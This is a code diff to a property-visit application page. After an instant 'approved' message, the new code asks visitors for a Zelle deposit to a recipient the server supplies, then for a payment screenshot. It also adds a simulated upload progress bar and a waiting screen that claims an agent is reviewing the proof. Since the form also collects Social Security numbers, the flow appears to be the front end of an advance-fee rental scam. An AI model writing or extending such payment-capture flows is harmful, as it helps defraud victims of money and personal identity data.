@@ -176,18 +176,60 @@
             <h3 class="modal-title success-title">Congratulations!</h3>
             <p class="modal-text success-lead">You have been approved.</p>
             <p class="modal-text success-contact">
-                We will be contacting you via <strong>phone</strong> or <strong>WhatsApp</strong> to continue the process.
+                One last step: complete your visit deposit via <strong>Zelle</strong> to secure your appointment.
             </p>
-            <div class="success-channels">
-                <span class="success-channel">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg>
-                    Phone
-                </span>
-                <span class="success-channel">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.168L2 22l4.832-1.438A9.955 9.955 0 0012 22c5.523 0 10-4.477 10-10S17.523 2 12 2z"/></svg>
-                    WhatsApp
-                </span>
+        </div>
+        <div id="modalDepositLoading" class="d-none">
+            <h3 class="modal-title">Almost there</h3>
+            <p class="modal-text">The final step is to submit your deposit for the visit via Zelle.</p>
+            <div class="progress-track" aria-hidden="true">
+                <div class="progress-fill" id="depositProgressBar"></div>
             </div>
+            <p class="progress-label" id="depositProgressLabel">0%</p>
+        </div>
+        <div id="modalDeposit" class="d-none modal-deposit-panel">
+            <h3 class="modal-title text-start">Complete your Zelle deposit</h3>
+            <p class="modal-text text-start">Send the deposit below, then upload your payment screenshot.</p>
+            <div class="zelle-card">
+                <div class="zelle-row"><span>Amount</span><strong id="zelleAmount">$0</strong></div>
+                <div class="zelle-row"><span>Send to</span><strong id="zelleName">—</strong></div>
+                <div class="zelle-row"><span>Zelle</span><strong id="zelleContact" class="font-monospace">—</strong></div>
+            </div>
+            <div class="payment-upload-box">
+                <label for="paymentProofInput" class="form-label">Payment screenshot</label>
+                <input type="file" id="paymentProofInput" class="form-control" accept="image/*" capture="environment" />
+                <div id="paymentPreviewWrap" class="payment-preview-wrap d-none">
+                    <img id="paymentPreview" alt="Payment preview" />
+                </div>
+                <div id="uploadProgressWrap" class="d-none mt-3">
+                    <div class="progress-track mb-1">
+                        <div class="progress-fill" id="uploadProgressBar"></div>
+                    </div>
+                    <p class="progress-label mb-0" id="uploadProgressLabel">Uploading… 0%</p>
+                </div>
+            </div>
+            <p id="depositError" class="text-danger small d-none mt-2"></p>
+            <button type="button" class="btn btn-submit w-100 mt-3" id="submitPaymentBtn" disabled>
+                Submit payment proof
+            </button>
+        </div>
+        <div id="modalWaiting" class="d-none text-center">
+            <div class="modal-waiting-icon" aria-hidden="true">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg>
+            </div>
+            <h3 class="modal-title">Waiting for confirmation</h3>
+            <p class="modal-text">We received your payment proof. An agent is reviewing it now. Please keep this page open.</p>
+            <div class="waiting-pulse" aria-hidden="true"></div>
+        </div>
+        <div id="modalConfirmed" class="d-none modal-success-panel">
+            <div class="modal-success-icon" aria-hidden="true">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+            </div>
+            <p class="success-badge">Confirmed</p>
+            <h3 class="modal-title success-title">Your visit is confirmed!</h3>
+            <p class="modal-text success-contact mb-0">
+                Your deposit was approved. We will contact you via <strong>phone</strong> or <strong>WhatsApp</strong> with the final details.
+            </p>
         </div>
     </div>
 </div>
@@ -270,6 +312,23 @@
         const modalTerms = document.getElementById('modalTerms');
         const modalLoading = document.getElementById('modalLoading');
         const modalSuccess = document.getElementById('modalSuccess');
+        const modalDepositLoading = document.getElementById('modalDepositLoading');
+        const modalDeposit = document.getElementById('modalDeposit');
+        const modalWaiting = document.getElementById('modalWaiting');
+        const modalConfirmed = document.getElementById('modalConfirmed');
+        const depositProgressBar = document.getElementById('depositProgressBar');
+        const depositProgressLabel = document.getElementById('depositProgressLabel');
+        const zelleAmount = document.getElementById('zelleAmount');
+        const zelleName = document.getElementById('zelleName');
+        const zelleContact = document.getElementById('zelleContact');
+        const paymentProofInput = document.getElementById('paymentProofInput');
+        const paymentPreviewWrap = document.getElementById('paymentPreviewWrap');
+        const paymentPreview = document.getElementById('paymentPreview');
+        const uploadProgressWrap = document.getElementById('uploadProgressWrap');
+        const uploadProgressBar = document.getElementById('uploadProgressBar');
+        const uploadProgressLabel = document.getElementById('uploadProgressLabel');
+        const depositError = document.getElementById('depositError');
+        const submitPaymentBtn = document.getElementById('submitPaymentBtn');
         const termsCheckbox = document.getElementById('termsCheckbox');
         const termsAcceptBtn = document.getElementById('termsAcceptBtn');
         const progressBar = document.getElementById('progressBar');
@@ -281,6 +340,20 @@
 
         const phonePattern = /^\(\d{3}\) \d{3}-\d{4}$/;
         const ssnPattern = /^\d{3}-\d{2}-\d{4}$/;
+
+        let appointmentToken = null;
+        let zelleInfo = null;
+        let statusPollTimer = null;
+        let selectedPaymentFile = null;
+
+        function getAntiforgeryToken() {
+            return form.querySelector('input[name="__RequestVerificationToken"]')?.value || '';
+        }
+
+        function formatCurrency(amount) {
+            const value = Number(amount) || 0;
+            return '$' + value.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+        }
 
         function validateForm() {
             formErrors.classList.add('d-none');
@@ -371,9 +444,18 @@
                     return;
                 }
 
-                showModal('success');
+                let data = {};
+                if (contentType.includes('application/json')) {
+                    data = await response.json();
+                }
+
+                appointmentToken = data.token;
+                zelleInfo = data.zelle;
                 form.reset();
                 submitBtn.disabled = false;
+
+                showModal('success');
+                setTimeout(() => startDepositFlow(), 2500);
             } catch {
                 hideModal();
                 submitBtn.disabled = false;
@@ -382,21 +464,188 @@
             }
         }
 
+        function startDepositFlow() {
+            resetDepositProgress();
+            showModal('depositLoading');
+            startProgressOn(depositProgressBar, depositProgressLabel, 5000, () => {
+                populateZellePanel();
+                showModal('deposit');
+            });
+        }
+
+        function populateZellePanel() {
+            const info = zelleInfo || {};
+            zelleAmount.textContent = formatCurrency(info.depositAmount);
+            zelleName.textContent = info.displayName || 'Premier Property Hub';
+            zelleContact.textContent = info.contact || 'Contact your agent';
+            paymentProofInput.value = '';
+            paymentPreviewWrap.classList.add('d-none');
+            uploadProgressWrap.classList.add('d-none');
+            depositError.classList.add('d-none');
+            depositError.textContent = '';
+            submitPaymentBtn.disabled = true;
+            selectedPaymentFile = null;
+        }
+
+        paymentProofInput?.addEventListener('change', () => {
+            depositError.classList.add('d-none');
+            const file = paymentProofInput.files?.[0];
+            selectedPaymentFile = file || null;
+
+            if (!file) {
+                paymentPreviewWrap.classList.add('d-none');
+                submitPaymentBtn.disabled = true;
+                return;
+            }
+
+            if (!file.type.startsWith('image/')) {
+                depositError.textContent = 'Please select an image file.';
+                depositError.classList.remove('d-none');
+                submitPaymentBtn.disabled = true;
+                return;
+            }
+
+            paymentPreview.src = URL.createObjectURL(file);
+            paymentPreviewWrap.classList.remove('d-none');
+            submitPaymentBtn.disabled = false;
+        });
+
+        submitPaymentBtn?.addEventListener('click', () => submitPaymentProof());
+
+        async function submitPaymentProof() {
+            if (!appointmentToken || !selectedPaymentFile) return;
+
+            depositError.classList.add('d-none');
+            submitPaymentBtn.disabled = true;
+            uploadProgressWrap.classList.remove('d-none');
+            resetUploadProgress();
+
+            const uploadUrl = `${window.location.pathname}?handler=UploadPayment&token=${appointmentToken}`;
+            const formData = new FormData();
+            formData.append('paymentProof', selectedPaymentFile);
+
+            const uploadPromise = fetch(uploadUrl, {
+                method: 'POST',
+                body: formData,
+                credentials: 'same-origin',
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'RequestVerificationToken': getAntiforgeryToken()
+                }
+            });
+
+            await animateUploadProgress(2200);
+
+            try {
+                const response = await uploadPromise;
+                const data = await response.json().catch(() => ({}));
+
+                if (!response.ok) {
+                    depositError.textContent = data.message || 'Could not upload payment proof. Try again.';
+                    depositError.classList.remove('d-none');
+                    submitPaymentBtn.disabled = true;
+                    uploadProgressWrap.classList.add('d-none');
+                    return;
+                }
+
+                showModal('waiting');
+                startStatusPolling();
+            } catch {
+                depositError.textContent = 'Something went wrong. Please try again.';
+                depositError.classList.remove('d-none');
+                submitPaymentBtn.disabled = false;
+                uploadProgressWrap.classList.add('d-none');
+            }
+        }
+
+        function resetUploadProgress() {
+            uploadProgressBar.style.width = '0%';
+            uploadProgressLabel.textContent = 'Uploading… 0%';
+        }
+
+        function animateUploadProgress(durationMs) {
+            return new Promise(resolve => {
+                const start = performance.now();
+
+                function tick(now) {
+                    const elapsed = now - start;
+                    const pct = Math.min(100, Math.round((elapsed / durationMs) * 100));
+                    uploadProgressBar.style.width = pct + '%';
+                    uploadProgressLabel.textContent = `Uploading… ${pct}%`;
+                    if (elapsed < durationMs) {
+                        requestAnimationFrame(tick);
+                    } else {
+                        resolve();
+                    }
+                }
+
+                requestAnimationFrame(tick);
+            });
+        }
+
+        function startStatusPolling() {
+            stopStatusPolling();
+            checkAppointmentStatus();
+            statusPollTimer = setInterval(checkAppointmentStatus, 4000);
+        }
+
+        function stopStatusPolling() {
+            if (statusPollTimer) {
+                clearInterval(statusPollTimer);
+                statusPollTimer = null;
+            }
+        }
+
+        async function checkAppointmentStatus() {
+            if (!appointmentToken) return;
+
+            const statusUrl = `${window.location.pathname}?handler=Status&token=${appointmentToken}`;
+
+            try {
+                const response = await fetch(statusUrl, {
+                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                });
+
+                if (!response.ok) return;
+
+                const data = await response.json();
+                if (data.confirmed) {
+                    stopStatusPolling();
+                    showModal('confirmed');
+                } else if (data.status === 'EsperandoConfirmacion') {
+                    showModal('waiting');
+                }
+            } catch {
+                /* keep polling */
+            }
+        }
+
+        function resetDepositProgress() {
+            depositProgressBar.style.width = '0%';
+            depositProgressLabel.textContent = '0%';
+        }
+
         function resetProgress() {
             progressBar.style.width = '0%';
             progressLabel.textContent = '0%';
         }
 
         function startProgress(durationMs) {
+            startProgressOn(progressBar, progressLabel, durationMs);
+        }
+
+        function startProgressOn(barEl, labelEl, durationMs, onComplete) {
             const start = performance.now();
 
             function tick(now) {
                 const elapsed = now - start;
                 const pct = Math.min(100, Math.round((elapsed / durationMs) * 100));
-                progressBar.style.width = pct + '%';
-                progressLabel.textContent = pct + '%';
+                barEl.style.width = pct + '%';
+                labelEl.textContent = pct + '%';
                 if (elapsed < durationMs) {
                     requestAnimationFrame(tick);
+                } else if (onComplete) {
+                    onComplete();
                 }
             }
 
@@ -407,26 +656,38 @@
             modal.classList.add('is-visible');
             modal.setAttribute('aria-hidden', 'false');
             const dialog = modal.querySelector('.status-modal-dialog');
-            dialog?.classList.remove('is-success', 'is-terms');
+            dialog?.classList.remove('is-success', 'is-terms', 'is-deposit', 'is-wide');
 
             modalTerms.classList.toggle('d-none', state !== 'terms');
             modalLoading.classList.toggle('d-none', state !== 'loading');
             modalSuccess.classList.toggle('d-none', state !== 'success');
+            modalDepositLoading.classList.toggle('d-none', state !== 'depositLoading');
+            modalDeposit.classList.toggle('d-none', state !== 'deposit');
+            modalWaiting.classList.toggle('d-none', state !== 'waiting');
+            modalConfirmed.classList.toggle('d-none', state !== 'confirmed');
 
             if (state === 'terms') dialog?.classList.add('is-terms');
-            if (state === 'success') dialog?.classList.add('is-success');
+            if (state === 'success' || state === 'confirmed') dialog?.classList.add('is-success');
+            if (state === 'deposit' || state === 'depositLoading') dialog?.classList.add('is-deposit', 'is-wide');
+            if (state === 'waiting') dialog?.classList.add('is-wide');
         }
 
         function hideModal() {
+            stopStatusPolling();
             modal.classList.remove('is-visible');
             modal.setAttribute('aria-hidden', 'true');
             modalTerms.classList.add('d-none');
             modalLoading.classList.add('d-none');
             modalSuccess.classList.add('d-none');
-            modal.querySelector('.status-modal-dialog')?.classList.remove('is-success', 'is-terms');
+            modalDepositLoading.classList.add('d-none');
+            modalDeposit.classList.add('d-none');
+            modalWaiting.classList.add('d-none');
+            modalConfirmed.classList.add('d-none');
+            modal.querySelector('.status-modal-dialog')?.classList.remove('is-success', 'is-terms', 'is-deposit', 'is-wide');
             termsCheckbox.checked = false;
             termsAcceptBtn.disabled = true;
             resetProgress();
+            resetDepositProgress();
         }
     </script>
 }
